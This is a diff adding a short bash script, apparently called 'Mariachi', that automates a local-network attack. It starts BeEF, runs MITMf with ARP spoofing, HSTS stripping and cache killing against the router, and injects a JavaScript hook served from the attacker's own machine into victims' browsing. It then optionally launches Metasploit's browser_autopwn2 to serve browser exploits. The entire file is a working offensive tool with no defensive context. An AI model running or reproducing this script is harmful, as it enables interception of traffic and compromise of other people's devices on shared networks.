@@ -1,0 +1,24 @@
+echo "[*] Initializing Mariachi..."
+echo "[x] Starting Apache Server..."
+/etc/init.d/apache2 start
+MYIP=$(myip)
+echo "[*] IP: $MYIP"
+echo "[*] Getting router IP..."
+ROUTERIP=$(routerip)
+echo "[*] Router IP: $ROUTERIP"
+echo "[*] Starting BeEF Framework..."
+screen -S beef -d -m beef
+echo "[*] Starting MiTMf..."
+screen -S mitmf -d -m mitmf -i wlan0 --arp --spoof --cachekill --hsts --gateway $ROUTERIP --inject --js-url http://$MYIP/mariachi.js
+read -r -p "[*] Use Metasploit? [y/N] " response
+case $response in
+    [yY][eE][sS]|[yY]) 
+        echo "[*] Starting Metasploit..."
+        ;;
+    *)
+        exit
+        ;;
+esac
+echo "use auxiliary/server/browser_autopwn2\nset SRVHOST $MYIP\nset URIPATH bingo\nrun\n" > /tmp/mitm.rc
+msfconsole -r /tmp/mitm.rc
+
